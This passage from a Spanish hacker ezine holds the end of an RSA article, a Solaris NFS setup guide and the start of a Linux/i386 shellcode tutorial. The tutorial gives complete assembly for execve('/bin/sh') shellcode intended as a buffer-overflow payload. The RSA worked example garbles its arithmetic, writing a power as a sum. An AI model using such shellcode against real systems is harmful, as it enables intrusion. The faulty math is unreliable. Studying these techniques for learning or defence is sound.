                                = m * 1 mod pq (por el teorema de Fermat)
                                = m mod pq
			        = m. (dado que m es menor que pq)

5.1 Ejemplo RSA
^v^v^v^v^v^v^v^

Para simplificar los calculos, se van a tomar dos primos pequeños: p=5
y q=11. El producto n=55. Para el calculo de (p-1)(q-1) tenemos 4 x 10 =
40. Para la clave e se puede escoger cualquier numero coprimo con 40,
por ejemplo e=3. Siendo otro ejemplo mas como el visto en el  apartado
tres (Algoritmo de Euclides), tenemos para estos valores:

27 x 3 + (-2) x 40 =1

Asi pues, d=27. Para encriptar un numero m tenemos que calcular:

E(m)=m^(3) mod 55

y para desencriptar el mensaje cifrado C:

D(C)=C^(27) mod 55

Para este ejemplo, se tomara mas que un mensaje, un solo caracter, el
"M", que en funcion del codigo ASCII, ocupa la posicion correspondiente
al numero 77.

E(77)=77^(3) mod 55
     =456533 mod 55
     =33

Es decir, en lugar de enviar un valor "77" (la M) enviariamos un "33".
El receptor, que conoce la clave d=27, tiene que calcular:

D(33) = 33^(27) mod 55

En este punto, nos encontramos con el problema de que el exponente al
que hay que elevar el valor de C es muy grande y no parece viable el
realizar la multiplicacion de 33 por si mismo 27 veces. Para subsanar en
parte este problema podemos utilizar un algoritmo de exponenciacion
rapida: Con dos numeros naturales a y b, buscandose calcular ab, tomamos
la representacion binaria de b:

 b=2^0 b0 + 2^1 b1 + 2^2 b2 + ... +  2^n bn

La potencia a calcular en funcion de dicha representacion sera:

a^b=a^(20b sub 0 + 21b sub 1 + 22b sub 2 + ... +  2nb sub n) =

     n
   _____
   |   |
=  |   |  a^(2^(i)b sub i)
  _|   |_
   i = 0

Siendo ese simbolo ( letra PI del alfabetro griego) el de
multiplicatorio.

Los valores de b sub i solo pueden valer 0 o 1, por lo tanto, solo se
ha de tener en cuenta los digitos binarios de de b que valgan 1.
Aplicado al caso que nos ocupa:

b=27 ; a=33

En el sistema binario
b=11011

Utilizando el sistema posicional para volver a base 10:

b= 2^(0)b sub1 + 2^(1)b sub1 + 2^(2)b sub0 + 2^(3)b sub1 + 2^(4)b sub 1

Comprobacion:

20 + 21 + 23 + 24 = 1 + 2 +8 + 16 = 27

Asi pues, para a^b (33^27):


33^27=33^1 + 33^2 + 33^8 + 33^16

En caso de que, al operar con numeros mayores, tambien uno o mas de uno
de los sumandos resultantes sea una potencia grande, seria posible
"encadenar" este procedimiento a dicho sumando.

Por lo tanto, calculando

(33^1 + 33^2 + 33^8 + 33^16) mod 55
((33 mod 55)(44 mod 55)(11 mod 55)(20 mod 55) mod 55 = 77

obteniendo como resultado de nuevo "77", la "M".


6.Notas finales
^v^v^v^v^v^v^v^
El sistema RSA ha sido uno de los mas estudiados hasta el momento y por
lo tanto se considera que es uno de los mas seguros, ya que ha podido
superar todo tipo de controversia, asi que es hoy por hoy uno de los
sistema criptograficos de llave publica mas usados en la industria, en
el comercio, en los gobiernos, en los organos militares y en general en
toda actividad que requiera que su informacion tenga un alto grado de
seguridad criptografica. Es bueno decir que hasta hoy se han
desarrollado una gran cantidad de sistemas de llave publica con el fin
de sustituir, generalizar o simplemente competir con RSA, solo que no
han tenido gran exito, en principio deben de pasar un riguroso
criptoanalisis por parte de la comunidad criptografica y despues se
someten a la competencia comercial, la prueba es en general proporcionar
al menos la misma seguridad de los sistemas existentes con al menos la
misma facilidad de implementacion y despues que basen su seguridad en
problemas muy duros. Hasta hoy solo los sistemas basados en el Problema
del Logaritmo Discreto Eliptico (PLDE) (para mas informacion ir a
http://www.certicom.com/ecc/index.htm ) han podido competir con exito
con el sistema RSA, incluso son mas prometedores que RSA ya que con solo
llaves de 160 bits proporcionan la misma seguridad que RSA. Otro tipo de
sistemas basan su seguridad en el PFE, sin embargo, se ha demostrado que
son equivalente a RSA, por lo cual se desechan, es decir, necesitan la
misma o mayor longitud de llaves que RSA.


Para cualquier comentario, critica, bla bla bla, mail a
powr@netsearch-ezine.com, preferiblemente usando mi clave publica que es:

<++> llavesPGP/powr.asc $bf55e488ef1f215b14215591c9a0b0e6
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.4 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDeBLW8RBACi7tJxtdn+BV5MUL0XEET6pDkZHm6FT/8+LeYfQNo5sOhX5VLO
Ptmnr/gNDDgu5Po/qTjNaSrlFmZ3qO5911TGk6kCJ7HOCs1CjHLg39lJp9BXQGJO
a7C32cFlVlYRdp52EGKGveTwO3+EkNboEl/qwgNjR88+nzkwtroc+/hWpwCg1XYW
HPboRPzxhFYq0JOrWBFnESUD+wRGb1SfETT512oagB1dWxjMi63I8RfnCgn3WtGm
8vl0CIyFs7uysxtdFDU3l696uYIpD2yWCqzOqQCViAVNgN4SwUAT078x3SqtB0c6
Qv6OTSGncup7JpRwJmfJmOXVxwNE+WEF7LkJ0ruLfSx5qWfsoKtMv7ArbRxHi4qa
ZD7QA/9GF35bkDg7+gV5pu+9yYMIIaTV+4E57CpQ7wgB6uvw4aCSlsWqLHyL69c3
RXHyeqotKHmM7Uk0GMf0yYGr4Sf3X3rrlbPmkHGNz24/aWpoBVyuG6lenI9Hf+Jw
Pj8Vb6Ck1b0/JfYnWtXHqXHQNm4zd8cJAo1ay2+kDSQOZ65vKbQdRC5HLlEuIDxw
b3dyQHRoZXBlbnRhZ29uLmNvbT6IVQQTEQIAFQUCN4EtbwMLCgMDFQMCAxYCAQIX
gAAKCRBk0+Jh/PBhpk0PAJ9sZmbNuE7KiNzKxlJ0opAea0b1dgCeLGpMpZl3jdoi
n6/RxhBRuYe0/Wa0OlBvd1IgTmV0c2VhcmNoIChtYWlsIG5ldHNlYXJjaCkgPHBv
d3JAbmV0c2VhcmNoLWV6aW5lLmNvbT6IVwQTEQIAFwUCOfYFNAULBwoDBAMVAwID
FgIBAheAAAoJEGTT4mH88GGmybAAoNI5E3ZGAeK+EVt2M9iuuUpKseFoAKCt9+4q
9quz4zk7PwTN58ToI+Ap/LkCDQQ3gS29EAgAss/qambS3dz35x++RbrLrdGLF5yx
JTKSR2xvmjfmkJatchiW7SlbG0WYDrtk1jX2ZdVs8d6YzDmCgWV8YsJlXVlkgGWT
UeXj7k1xdICW/WiYVv/c54E/xNBgAS/VbfR4OknMWo05INdS0bn5FRsXx80Uh9iR
caGkfnKY6YpamdubxYJ3jMum2Pid9UyN7aSaD4T/2G0obYEgEzwbBtTxRYMmzz4x
d0RKwT0dXMwFhTrhxHQHDRUE6iHmC8UZwAdk0BZQ5FSWQPN1b14vZXgXDx3iGh0u
uL3xY/gYEFHh1NMFtRnZrrWGhaDARXF/zV0b2KRqOn4acK5L9+ynCajYKwADBQf/
UqnAKVsa4Ggr9qDCnOF1Xo5YgyaRkJqv0Ks+qFV3Dr4T/Y8pQu4Hk04x2HF6YVgL
6SYBeGYy/t94oL8akp6Grax6QiJDiyyBpdgkfq+bGuK013+DT0VAsm+43JYUrUYv
FvOlb4oAswHUmwWcfNHVPXmnJl2Gt78JbV/rd4ZNbmCFOA6I86SrOUJQ17lLq+o1
wkv87R8To5gA6mW8MswxJFQ8XinDFWM+e0vKSPespQTu5j961AW1wVxxbhexO+0H
P4HvCe51u2AtXL2ZK7wnoSmZZvR0xbe+hpVh2WPmq0JgesLBGMG7p1etej5qrfiP
Kt253EV6xI/lwqmdo4AXb4hGBBgRAgAGBQI3gS29AAoJEGTT4mH88GGmpU4AoJ0/
Z7xRvIh6ONFcXbi1yXdPuIMjAKCi8gV52gCSPd9gKzG/oEOVnUuILw==
=sHOo
-----END PGP PUBLIC KEY BLOCK-----
<-->

La base de este articulo fue realizada basandome en la propia
experiencia y en la siguiente bibliografia que recomiendo a todo el que
este interesado en estos temas:

- LUCENA LÓPEZ, Manuel Jose, Criptografia y seguridad en Computadores.
  Universidad de Jaen, Septiembre de 1999

- Bruce Schneier. Applied Cryptography. Second Edition. John Wiley &
  sons, 1996

- Juan Manuel Velazquez y Arturo Quirantes. Manual de PGP, 1998

- Cryptographic Algorithms
(http://www.eskimo.com/~weidai/algorithms.html)

- Facultat d'Informatica de Barcelona (http://www-ma2.upc.es/~cripto/)

- How to do it: Private Key Encryption (A method)
(http://www.geocities.com/SiliconValley/Platform/2946/comcrypt.htm)

- The Mathematical Guts of RSA Encryption
(http://world.std.com/~franl/crypto/rsa-guts.html)

- An Example of the RSA Algorithm
(http://world.std.com/~franl/crypto/rsa-example.html)

- RSA Security Inc.(http://www.rsa.com)


Bueno por ultimo, y pa dejar de dar ya la brasa jeje; este articulo, en
parte o en su totalidad puede ser reproducido SI Y SOLO SI se citan sus
fuentes y a su autor (usease, YO xD). No es por egocentrismo... es mas
bien porque el articulo no se ha escrito solo al darle una patada al
ordenador y me gustaria recibir comentarios de gente que pudiera leerlo
en medios secundarios.



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x03 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ NFS en Sistemas Solaris ]-===============================================
=-[ por HandeR ]-============================================================




        CONFIGURACION NFS EN SISTEMAS SOLARIS | CLIENTE - SERVIDOR 


-------------------
Introducion al NFS
-------------------
Sistemas de Ficheros Distribuidos
Network File System

NFS es un producto de Sun Microsystem que han acogido la mayoria de los 
sistemas operativos y se ha convertido en un estandar en el mercado como una 
excelente forma de aprovechar las ventajas de ficheros compartidos.

El sistema de ficheros NFS nos permite utilizar ficheros compartidos como
si fueran locales, con las infinitas aplicaciones que cada uno pueda 
interesarle. 

NFS tambien nos brinda la posiblidad de instalar en el servidor aplicaciones 
de manera de que todos los clientes ataquen a ellas sin la necesidad de tener
instalado el soft en el. Todos me direis q con un Xterminal tambien se puede
hacer esto, po si :) , pero yo aqui me limito a mostraros las caracteristicas
NFS no una comparativa con las diferentes alternativas.

A todos supongo que se os habra iluminados los ojos O_O cuando habeis pensado
en la posiblidad de montar recursos de un servidor en nuestra maquina Linux
y hacer uso de esos recursos como si fueran nuestros, por eso en Solaris 
disponemos de unos cuantos ficheros en el cual indicar quien puede y quien no 
puede montar estos sistemas de ficheros y desde donde se puede y desde donde no
se puede montar. (Nada insalbable :) )

Bueno me dejo de prologos por que me da la impresion que la gente a la que va
destianda este articulo conoce de sobra las ventajas y desventajas de NFS y 
que todos en una plataforma u otra hemos montado archivos de este tipo.
Asi que ahora explicare todas la particularidades de NFS en solaris
que en definitiva es el objetivo que todos vamos buscando.

----------
DEMONIOS
----------
Deberemos de diferenciar los distintos demonios que corren en cada maquina
dependiendo de su funcion

+ SERVIDOR
  El demonio nfsd es el encargado de montar un recurso cuando un cliente 
  hace la peticion.
  /usr/lib/nfs/nfsd
  Este demonio se arranca desde el script /etc/init.d/nfs.server
  
+ CLIENTE
  /usr/lib/nfs/statd
  /usr/lib/nfs/lockd
  Estos demonios se encargan de las recuperaciones en caso de fallo
  y de bloquear los recursos NFS 
  Se arrancan con el script 
  /etc/init.d/nfs.client


---------
COMANDOS
---------

SHARE
/usr/bin/share 

Este comando es el encargado realmente de exportar los recursos.

+ Sintaxis
  share [-F nfs] [-o opciones] [-d descripcion] recurso

  -F nfs es obligatorio en el fichero dfstab (detallado adelante) 
         pero no en el comando.
  
  -o opciones forma en que se montan los recursos compartidos

    "ro" Solo lectura ro=cliente:cliente Lista de cliente con acceso
         solo lectura    
    
    "rw" Lectura y escritura rw=cliente:cliente
    
   "root=cliente" El superusuario del sistema remoto puede actuar con 
                 privilegios sobre el recurso compartido (interesante :) ).
 
 Se pueden agrupar varios separados por comas

 El comando share sin niguna opcion nos muestra la lista de recursos
compartidos.

 Si introducimos el comando en el fichero /etc/dfs/fstab se realizara
la exportacion automatica cuando el sistema pase a nivel 3

 ej:

share -F nfs -o rw=vega:HandeR:Sp4rK,ro=Hardcode,root=vega
/export/home/


UNSHARE
  /usr/sbin/unshare 
  Este comando es utilizado para dejar de compartir un recurso 

+ Sintaxis
 unshare [-F nfs] recurso
 ej: unshare /export/home

SHAREALL Y UNSHAREALL
/usr/sbin/shareall comparte todo lo referenciado en /etc/dfs/dfstab
/usr/sbin/unshareall deja de exporta lo refenciadoen /etc/dfs/sharetab

+ Sintaxis
 unshareall [-F nfs]
 shareall [-F nfs]

MOUNT
 /sbin/mount 

Monta el recurso (no creo que haga falta explicar mucho este
comando, si realmente no lo conoces mejor que ... te busques un buen libro
de cualquier sistema *nix o que sigas utilizando placidamente tu equipo con 
tu producto ese q ofrece moco$oft que ahora mismo no recuerdo como se llama
y al que le hacen llamar sistema operativo xDDDDDDDD y pases pagina a este
articulo)

+ Sintaxis
 mount [-F nfs] [-o opciones] servidor:recurso punto-montaje

ej: mount vega:/export/home /home

Monta el directorio /export/home del host vega en nuesto 
directorio local /home

MOUNTALL
 Sin ninguna opcion el comando /sbin/mountall monta todos los
recursos de /etc/vfstab que tengan valor yes en "mount at boot" 
si solo queremos que monte los recursos remotos optaremos por la
opcion -r al igual q si solo queremos  montar los recursos NFS
optaremos por -F nfs

ej: mountall -r
    mountall -F nfs

UMOUNTALL
 Utiliza las mismas opciones que MOUNTALL pero esta vez lo q hace
es desmontarlos todos

UMOUNT
 /sbin/umount desmonta los recusos yo creo que ta claro :P

+ Sintaxis
  umount [-F nfs] servidor:recurso punto-montaje
 Tambien es posible utilizar solo servidor:recurso o bien el punto
de montaje
ej: umount /usr/share


---------
FICHEROS
---------

/etc/dfs/dfstab

Contiene los comandos shares que previamente le hemos introducido
(si ejecutamos nfs.sever no encuentra ninguan entrada en este fichero
no arranca el demonio /etc/dfs/dfstab

Los comandos de dfstab se ejecutan cuando:
+ El sistema pasa a nivel 3
+ Cuando superusuario usa shareall (si estan los demonios en marcha)
+ Cuando se ejecuta el script nfs.server (ya que contiene un shareall)

/etc/vfstab
 
Determina que recursos se montaran a la hora del arranque
 (equivalente a el fichero /etc/fstab de Linux particularidades de Solaris)

+ Campos del fichero

 "device to mount" Nombre del servidor y recursos compartido separados por :
                   vega:/export/home
 
 "device to fsck" Siempre Null los clientes no comprueban el estado
                  de los recursos
 
 "mount point" Punto de montaje por defecto
 
 "FS type" Tipo de sistema de ficheros del que estamos tratando ta claro NFS
 
 "fsck pass" Null igual que device to fsck
 
 "mount at boot" Aqui especificamos si el recurso se monta en tiempo de
                 arranque o cuando entre en nivel 2 (yes o no)
 
 "mount options" Lista de opciones separadas por comas
                 rw|ro Permisos de accesos por defecto rw
                 bg|fg reintentar el montaje en backgound o foreground 
                       por defecto fg
                 soft|hard continuar intentadolo o provocar un error si 
                      el servidor no responde (Defecto Hard)
                 intr|nointr Activar o desactivar la interrupcion por teclado
                      de un proceso en espera de ser montado
                 suid|nosuid permitir o no la ejecucion de setuid
                 timeo=n Timeout a las n decimas de seg. por defecto 11
                 retry Numero de reintentos por defecto 10000


=================================================================
                         EJEMPLO PRACTICO
=================================================================
Disponemos de equipos solaris y queremos que uno de ellos comparta 
por medio de NFS espacio en sus disco de forma q el otro equipo
pueda disponer de los datos o software de ese equipo de forma
transarente como si estuviera trabajando localmente y nos 
permita escribir en el.
Llamaremos a los equipos svrsolaris y vega.

En el equipo svrsolaris el cual va a compartir el /export/archivos/
debemos de realizar las siguientes operaciones

1) Editaremos el fichero /etc/dfs/dfstab para permitir la exportacion 
automatica cuando entremos en nivel 3 añadiremos la siguiente linea

share -F nfs -o rw /export/archivos

2) Arrancaremos los demonios

/etc/init.d/nfs.server start

3) Podemos ejecutar el comando dfshares para comprobar si lo exporta 
correctamente

a) Si queremos dejar de exportar este recurso

unshare /export/archivos

En el equipo vega desde donde pretendemos acceder a esos datos
seguiremos los siguientes pasos:

1) Comprobamos los recursos disponibles por el servidor

dfshares svrsolaris

2) Montamos el recurso

mount vega:/export/archivos /home/archivos

3) Si queremos q el recurso se monte automaticamente editaremos el 
fichero /etc/vfstab ya añadiremos la siguiente linea

vega:/export/archivos - /home/archivos nfs yes

observa que "-" es dejar en blanco ese parametro

a) Para desmontar ese recurso utilizaremos:

umount /home/archivos



_______________________________________________________________________________

Bueno pienso que con el articulo ha quedado claro todo el tema de Sistemas 
de ficheros NFS con la particularidares del SO Solaris que nos es mas que otro 
de los muchos *nix que hay en el mercado.

Cada uno de estos *nix tiene sus particularidades pero en el fondo todos son
los mismos cambiando algunos detalles como ficheros de configuracion, algun 
que otro comando y poco mas.

Yo he elegido Solaris al ser este con el cual me peleo todos los dias en el
trabajo y por ser uno de los mas utilizados en los grandes servidores de la
red. 
Tampoco es que sea un articulo en el cual detalle hasta el mas minimo 
rincon del NFS, pero servira de guia para aquel que tenga que enfrentarse 
con el :)
Este articulo ha sido construido a raiz de mi experiencia con NFS, manuales
de Sun, y mucha literatura que por la red podemos encontrar.
Pos nada espero que os haya gustado y hasta otro articulillo para NetSearch
Ezine.

EL AUTOR POR SUPUESTO NO SE HACE RESPONSABLE DE ... AMOS LO TIPICO QUE ESTO
ESTA ESCRITO CON MOTIVOS DIDACTICOS ASI Q EA SED WENOS Y A DISFRUTA DER NFS xD

HandeR
hander@jazzfree.com 



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x04 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Shellcodes en Linux/i386 ]-==============================================
=-[ por RaiSe ]-=============================================================




----------------
// 0.- Indice
----------------

0.- Indice.
1.- Prologo.
2.- Que es y para que se usa una shellcode.
3.- Variantes del ensamblador de Intel al de AT&T.
  3.1.- Mov.
  3.2.- Direcciones de memoria.
  3.3.- Interrupciones en Linux (syscalls).
4.- 'Codeando' una shellcode simple.
5.- 'Codeando' una shellcode de varios args.
6.- Pasando el codigo a un string.
7.- Comprobando una shellcode.
8.- Sources.
9.- Notas finales.


-----------------
// 1.- Prologo
-----------------


Nass, en este texto intentare explicar detalladamente como programar una
shellcode bajo el sistema operativo linux y usando un procesador intel&compa-
tible. Para comprenderlo necesitareis tener un nivel minimo de ensamblador,
conocimientos de stack overflows, y de programacion en C. Dentro del texto
tambien dos shellcodes desarrolladas por mi bastante practicas ;).

En fin, empecemos ..


------------------------------------------------
// 2.- Que es y para que se usa una shellcode
------------------------------------------------


Una shellcode es basicamente una serie de ordenes en ensamblador que hace al-
go de la cual sacamos provecho; ejecutar /bin/sh para obtener una shell, co-
piar una shell y setearla con suid root, etc. Tiene unas caracteristicas de
programacion un tanto especiales que luego veremos en detalle.

Se usa para conseguir ejecutar un codigo despues de haber sobreescrito la di-
reccion de retorno de un programa/funcion mediante un overflow, o mediante
cualquier otro metodo valido. Es decir, el valor de la direccion de retorno
que se sobreescribira sera la de nuestra shellcode. No me meto mucho en esto
porque la finalidad de este texto no es como programar un xploit de buffer
overflow, sino una shellcode. Simplemente decir que cuando se produzca el
desbordamiento y el salto se ejecutara nuestra shellcode.


-------------------------------------------------------
// 3.- Variantes del ensamblador de Intel al de AT&T
-------------------------------------------------------


El ensamblador que usaremos para programar la shellcode varia un poco del ti-
pico ensablador de msdos. Resumiendo aqui estan las instrucciones que se di-
ferencian y en que:


3.1.- Mov. 

En Intel seria algo como "mov eax,1", en AT&T "movb $0x1,%al". Es decir, se
intercambia el orden de los operandos, cuando vas a mover un dato (no una di
reccion de memoria) le pones un '$' delante, y cuando usas un registro le po-
nes '%'. Mov consta de 3 instrucciones: movl (4 bytes), movw (2 bytes) y movb
(1 byte). [Decir que estas extensiones (l-w-b) son validas para cualquier ins-
truccion].

Los registros tambien tienen extensiones: eax (4 bytes), ax (2 bytes) y ah/al
(1 byte cada uno).


3.2.- Direcciones de memoria. 

En Intel seria "mov eax,[ecx]", en AT&T "movl (%ecx),%eax". Es decir, cambia
[] por (). Despues a las comillas se les puede añadir un numero, viendolo en
un ejemplo: Intel -> "mov eax,[ecx+5]" AT&T -> "mov 0x3(%ecx),%eax", mueve a
%eax el contenido que hay en la direccion de memoria del valor de %ecx + 3
(notese que el 3 no lleva el $ delante). Tambien puedes poner un valor nega-
tivo, ej: "mov -0x3(%ecx),%eax" (direccion de memoria - 3).


3.3.- Interrupciones en Linux (syscalls).

En linux, en vez de utilizar las famosas interrupciones que se usan en msdos,
utilizaremos las conocidas syscalls. Una syscall tiene cierto parecido con una
interrupcion, por ejemplo hay q pasarle unos determinados parametros. Hay
syscall para abrir ficheros, otra para escribir en ellos, otra para cerrar-
los, etc. Teneis una lista disponible en el fichero /usr/include/asm/unistd.h
de vuesto linux :). Las llamadas se realizan usando la interrupcion 0x80 (es-
to lo veremos mas adelante).

Solo decir que cuando vayamos a llamar a una sycall, el numero de la misma se
coloca en eax, y los argumentos en ebx, ecx, edx, esi y edi. El valor de re-
torno se colocara en eax una vez finalizada la ejecucion de la syscall. Ponga-
mos un ejemplo practico: la funcion/syscall open.. Como sabreis el prototipo
de open seria algo como:

int open(const char *pathname, int flags);

Analicemos.. en eax se colocaria la syscall de open, que segun la table de
asm/unistd.h seria el 5. En ebx colariamos una direccion de memoria (ya q es
un puntero) que apunte a un string en memoria con el path del fichero que
queremos abrir. Y en ecx colacariamos el valor del flag con el que queremos
abrir el chivo. Facil, no? :). Si la syscall tuviera mas de 5 argumentos ha-
bria que usar otro metodo que paso de explicar, ya que la gran mayoria de
llamadas al sistema usa 5 o menos argumentos. Bueno, empecemos con nuestro
primer codigo de una shellcode ..


-----------------------------------------
// 4.- 'Codeando' una shellcode simple
-----------------------------------------


Primero empezaremos con la tipica shellcode que ejecute /bin/sh, despues ya
tendremos tiempo de complicarnos la vida :). Para ejecutar la shellcode
usaremon la funcion/syscall execve. Echemos una rapida ojeada al prototipo de
la funcion execve:

int execve (const char *filename, char *const argv [], char *const envp[]);

Recapitulemos..en %eax debera ir el numero de syscall perteneciente a execve,
echamos otra ojeada al fichero /usr/include/asm/unistd.h y podemos ver lo si-
guiente:

#define __NR_execve              11

En efecto, nuestra syscall es la 11 :). Sigamos con el prototipo.. si lo que
dije antes era verdad, en %ebx deberia ir un puntero a un string que conten-
dra el path del fichero a ejecutar, en nuestro caso /bin/sh. Es imporante
que %ebx contenga una direccion de memoria ya que el argumento se pasa a la
funcion como puntero (const char *filename). Sigamos.. entonces por la misma
razon en %ecx debera haber un array de punteros (char *const argv []), que
contendra cada uno los argumentos del filename que ejecutaremos. Como eje-
cutaremos /bin/sh sin ningun argumento quedara algo como esto:

. argv[0] -> /bin/sh
. argv[1] -> 0x00

Recordemos que un array de punteros siempre termina cuando un puntero apunta
a un nulo. Sigamos.. char *const envp[], el tercer argumento que debera ir
en %edx. Aqui metermos una direccion de memoria que apunte a un nulo, ya que
no nos interesa que /bin/sh se ejecute con alguna variable de entorno que
queramos definir. Resumiendo todo este rollo quedaria algo como esto:


		+----------------+--------------------------+
		|    Registro    |          Valor           |
		+================+==========================+
		|      %eax	 |          *0xb*           |
		+----------------+--------------------------+	
                |      %ebx      |   *direccion "/bin/sh"*  |
                +----------------+--------------------------+
                |                |   *direccion argv[]*     |
		|      %ecx	 |   argv[0] = "/bin/sh"    |
		|		 |   argv[1] = 0x00	    |
                +----------------+--------------------------+
                |      %edx      |   *direccion 0x00*       |
                +----------------+--------------------------+


Ahora se nos plantea un problema.. como conseguir la direccion de memoria del
string "/bin/sh". No sabremos en que zona de memoria exacta se ejecutara la
shellcode, por lo tanto no podemos poner una direccion 'estatica'. Para so-
lucionarlo usaremos el metodo del jmp/call, mediante el cual no importara en
donde se ejecute la shellcode ya que siempre sabremos la direccion exacta del
string. Para comprenderlo hay que fijarse en lo que pasa cuando se produce un
call (llamada a una funcion) en un codigo. Y que es lo que pasa os estareis
preguntando, pues muy sencillo, se guarda la direccion de retorno en la pila
para continuar su ejecucion una vez se produzca un ret, es decir, termine la
funcion a la que se habia llamado mediante el call. Y cual es la direccion de
retorno que se guardara en la pila?.. pues justo la siguiente a la llamada al
call. Ahora observemos este codigo:

		
			jmp 0xa --------+
		 +--->	popl %esi       |
		 |	  .	        |
		 |	  .		|
		 |	[ codigo ]      |
		 |	  .	        |
		 |	  .	        |
		 +----	call -0xc  <----+     
			/bin/sh


Empieza la ejecucion del codigo y encuentra el jmp 0xa, salta 10 bytes, con
lo que se encuentra el call. El call llama a una funcion que en realidad es
el codigo situado a -0xc, 12 bytes de memoria mas 'arriba'. Con lo cual, pri-
mero guarda la direccion de la instruccion siguiente al call, que es la dire-
ccion de nuestro string /bin/sh, en la pila, y salta al popl. Como lo que
esta en el tope de la pila es la direccion del string, la guardamos en %esi
y ya tenemos la direccion del string almacenada :).

Bueno, y despues de esta pequeña introduccion veamos un codigo de una shell-
code que funciona de verdad ejecutando /bin/sh. Lo pego entero y luego voy
comentandolo.

 
<-- Codigo -->

        jmp    0x1f
        popl   %esi
        xorl   %eax,%eax
        movb   %al,0x7(%esi)
        movl   %esi,0x8(%esi)
        movl   %eax,0xc(%esi)
        movb   $0xb,%al
        movl   %esi,%ebx
        leal   0x8(%esi),%ecx
        leal   0xc(%esi),%edx
        int    $0x80
        xorl   %eax,%eax
        xorl   %ebx,%ebx
        inc    %eax
        int    $0x80
        call   -0x24
        .string \"/bin/sh\"

<-- Fin Codigo -->


Empecemos..

+ <jmp    0x1f>:

Saltar al call, 0x1f es el numero de bytes que debe saltar para encontrarse
con el call. Este numero no hay que calcularlo manualmente, a la hora de pro-
gramar una sc se pone un valor aleatorio (p.ej 0x10), y luego se mira cual se-
ria el valor correcto con el gdb una vez este terminado el codigo.

Una vez que ejecuta el call vuelve a saltar a la instruccion siguiente al jmp,
pero antes guarda en la pila el valor del string "/bin/sh".

+ <popl   %esi>:

Guarda en %esi la direccion del string "/bin/sh". Sino entiendes esto mejor
vuelve a leer el parrafo donde se explica como conseguir la direccion de un
string ;).

+ <xorl   %eax,%eax>:

Pone a cero %eax. No se puede poner <movl   $0x00,%eax> ya que despues, a la
hora pasar la shellcode a un string, nos apareceria un caracter \x00. Y si en
el string hay un nulo lo mas probable es que el programa que intentemos 'pe-
tar' interprete ese nulo como el final del argumento/comando, pare de copiar,
y no consigamos sobreescribir la direccion de retorno de la pila, aparte que
solo copiaremos media shellcode en memoria. Por lo tanto siempre tendremos
que andar jugando con registros de valor 0x00 para copiar nulos en memoria.
 
+ <movb   %al,0x7(%esi)>:

Copiamos un un byte nulo a la direccion de memoria %esi+0x7, es decir, a la
direccion justo despues de la 'h'. Quedaria algo como: "/bin/sh0". El nulo se
pone para marcar el final del string.

+ <movl   %esi,0x8(%esi)>:

Copiamos la direccion del string a la direccion de memoria %esi+0x8. Quedaria
algo como: "/bin/sh0direccion", donde direccion apunta a "/bin/sh". Lo que
estamos haciendo es preparar el array de punteros que le pasaremos a execve,
lo que acabamos de hacer seria lo mismo que argv[0]="/bin/sh".

+ <movl   %eax,0xc(%esi)>:

Copiamos un long nulo a la direccion de memoria %esi+0xc. Ahora seria algo co-
mo: "/bin/sh0direccion0", a diferencia de que el primer 0 es un byte y el se-
gundo 0 son 4 bytes. Acabamos de cerrar argv[] con un nulo. Entonces tenemos:

	. argv[0] = "/bin/sh"
	. argv[1] = Nulo

Con lo que terminamos el array de punteros.

+ <movb   $0xb,%al>:

Copiamos el valor 11 a %al, que es %eax en realidad ya que antes lo habiamos
inicializado a cero con el xorl. El valor 11 es el numero de la syscall de
execve.

+ <movl   %esi,%ebx>:

Copiamos la direccion del string "/bin/sh" seguido de un byte nulo (que ya 
pusimos previamente) en %ebx. Primer argumento de execve().

+ <leal   0x8(%esi),%ecx>:

Copiamos en %ecx la direccion de memoria %esi+0x8. En dicha direccion lo que
hay q es otra direccion apuntando a "/bin/sh" seguida de un long nulo. Segun-
do argumento de execve().

+ <leal   0xc(%esi),%edx>:

Copiamos en %edx la direccion %esi+0xc, es decir, la direccion de un long nu-
lo. Tercer y ultimo argumento de execve().

+ <int    $0x80>:

Llamamos a la syscall por medio de la interrupcion 0x80. Si todo funcionara
correctamente no haria falta mas codigo, pero por si el execve falla es con-
veniente añadir un exit(0). Eso es lo que vamos a hacer a continuacion.

+ <xorl   %eax,%eax>:

Ponemos %eax a cero.

+ <xorl   %ebx,%ebx>:

Idem con %ebx. Primer y ultimo argumento de exit().

+ <inc    %eax>:

Incrementa %eax, que pasara a tener el valor 1 ya que antes lo habiamos ini-
cializado a cero. El valor 1 es el numero de syscall de exit.

+ <int    $0x80>:

Llamamos a la syscall por medio de la interrupcion 0x80.

Fin :).


------------------------------------------------
// 5.- 'Codeando' una shellcode de varios args
------------------------------------------------


Para la shellcode anterior no se necesitaba pasar mas de un argumento a la
syscall, es decir a al execve(), ya que el unico argumento que necesitabamos
era el string "/bin/sh". Cuando necesitemos pasar mas de un arg la cosa se
complica un poco, pero poco.. ;). Si queremos ejecutar por poner un ejemplo:
"/bin/ls -l -a", tendremos que saber la direccion en memoria de cada argumen-
to y pasarselas al execve() por medio del array de punteros *argv[]. Si antes
teniamos:

. argv[0] -> /bin/sh
. argv[1] -> 0x00

ahora tendremos:

. argv[0] -> /bin/ls
. argv[1] -> -l
. argv[2] -> -a
. argv[3] -> 0x00

Es decir, lo mismo que antes pero con dos punteros mas.. (os recuerdo que
cada argumento debe ir seguido de un byte nulo para marcar el final del
string). Para conseguir colocar los 3 argumentos en memoria se usara un
string tipo: "/bin/ls0-l0-a", y luego desde la propia shellcode ponemos
cambiamos los ceros por nulos para ir marcando el final de cada argumento.
Al final en memoria tendremos "/bin/ls(nulo)-l(nulo)-a(nulo)".

Entonces veamos el codigo para ejecutar "/bin/ls -l -a", y luego voy comen-
tandolo como en el ejemplo anterior.


<-- Codigo -->

        jmp    0x31
        popl   %esi
        xorl   %eax,%eax
        movb   %al,0x7(%esi)
        movb   %al,0xa(%esi)
        movb   %al,0xd(%esi)
        movl   %esi,0xe(%esi)
        leal   0x8(%esi),%edi
        movl   %edi,0x12(%esi)
